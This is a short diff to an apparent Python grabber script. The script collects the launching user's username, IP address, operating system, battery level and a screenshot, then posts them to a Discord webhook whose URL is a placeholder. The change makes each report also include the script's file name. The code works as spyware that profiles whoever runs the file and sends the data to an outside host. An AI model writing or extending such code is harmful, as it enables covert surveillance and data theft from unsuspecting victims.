@@ -5,6 +5,7 @@ import platform
 import psutil
 from PIL import ImageGrab
 import os
+import sys
 
 username = getpass.getuser()
 webhook = "YOUR-WEBHOOK-URL"
@@ -37,13 +38,14 @@ if ip:
 else:
     userip = "Failed to get IP."
 
+script_name = os.path.basename(sys.argv[0])
 battery_percent = get_battery_percent()
 if battery_percent is not None:
     charge = battery_percent
 else:
     charge = "Failed to get battery."
 
-message3 = f"# New launch!\nUsername: {username}\nIP: {userip}\nOS: {oses}\nBattery: {charge}%\nScreenshot:"
+message3 = f"# New launch!\nFile name: {script_name}\nUsername: {username}\nIP: {userip}\nOS: {oses}\nBattery: {charge}%\nScreenshot:"
 
 def send_discord_message(webhook_url, message):
     payload = {
